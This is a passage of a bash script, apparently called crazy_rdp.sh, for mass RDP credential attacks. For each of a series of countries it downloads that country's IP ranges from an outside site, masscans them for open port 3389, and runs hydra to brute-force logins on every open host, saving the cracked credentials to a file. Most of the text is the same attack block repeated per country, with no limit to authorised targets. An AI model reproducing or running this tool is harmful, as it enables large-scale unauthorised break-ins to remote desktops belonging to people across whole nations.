read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "23" ]; then
curl http://ipdiapazon.16mb.com/Bermuda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "24" ]; then
curl http://ipdiapazon.16mb.com/Bhutan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "25" ]; then
curl http://ipdiapazon.16mb.com/Bolivia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "26" ]; then
curl http://ipdiapazon.16mb.com/Bosnia_and_herzegowina.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "27" ]; then
curl http://ipdiapazon.16mb.com/Botswana.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "28" ]; then
curl http://ipdiapazon.16mb.com/Brazil.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "29" ]; then
curl http://ipdiapazon.16mb.com/British_indian_ocean_territory.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "30" ]; then
curl http://ipdiapazon.16mb.com/Brunei_darussalam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "31" ]; then
curl http://ipdiapazon.16mb.com/Bulgaria.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "32" ]; then
curl http://ipdiapazon.16mb.com/Burkina_faso.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "33" ]; then
curl http://ipdiapazon.16mb.com/Burundi.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "34" ]; then
curl http://ipdiapazon.16mb.com/Cambodia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "35" ]; then
curl http://ipdiapazon.16mb.com/Cameroon.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "36" ]; then
curl http://ipdiapazon.16mb.com/Canada.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
